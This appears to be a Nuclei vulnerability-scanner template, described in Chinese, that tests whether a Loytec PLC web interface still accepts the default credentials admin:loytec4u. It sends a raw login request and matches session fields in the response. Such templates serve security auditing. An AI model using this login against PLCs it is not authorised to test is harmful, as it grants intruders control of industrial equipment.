id: loytec-default-password

info:
  name: Loytec PLC 默认口令登录（弱口令）
  author: biero-el-corridor
  severity: high
  description: |
    该模板通过尝试 Loytec PLC 的默认凭据（如 admin:loytec4u），并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统并访问相应管理功能或业务数据。
  metadata:
    verifed: true
    max-request: 1
  tags: loytec,default-login,vuln

variables:
  username: admin
  password: loytec4u

http:
  - raw:
      - |
        POST /webui/login HTTP/1.1
        Host: {{Hostname}}
        X-Create-Session: 1
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}&login=Login

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"sessUser":"admin"'
          - '"loggedIn":true'
        condition: and

      - type: status
        status:
          - 200
